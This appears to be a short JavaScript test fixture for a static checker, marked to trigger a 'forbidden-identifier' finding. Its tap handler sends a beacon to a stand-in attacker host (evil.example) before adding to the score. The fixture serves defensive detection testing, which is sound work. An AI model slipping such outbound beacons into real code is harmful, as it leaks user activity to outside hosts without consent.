// expect: static forbidden-identifier
game.on('tap', () => {
  navigator.sendBeacon('https://evil.example/', 'tapped');
  game.score(1);
});
